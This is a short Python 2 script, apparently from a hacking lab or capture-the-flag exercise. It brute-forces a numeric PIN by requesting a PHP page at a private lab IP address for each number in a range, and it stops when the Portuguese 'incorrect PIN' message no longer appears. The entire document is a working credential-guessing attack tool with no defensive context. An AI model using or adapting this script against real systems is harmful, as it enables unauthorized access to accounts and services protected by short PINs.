#!/usr/bin/python

import sys
import urllib2

inicio = int(sys.argv[1])
final = int(sys.argv[2])
#url = sys.argv[3]

for num in range(inicio, final):
	print "Testando PIN:%d" %num 
	url = "http://172.16.1.33/pin/pin.php?pin=%s"%num
	request = urllib2.Request(url)
	response = urllib2.urlopen(request)
	result = response.read()
	if "Pin incorreto" not in result:
		print "[+] PIN encontrado: %d" %num
		break
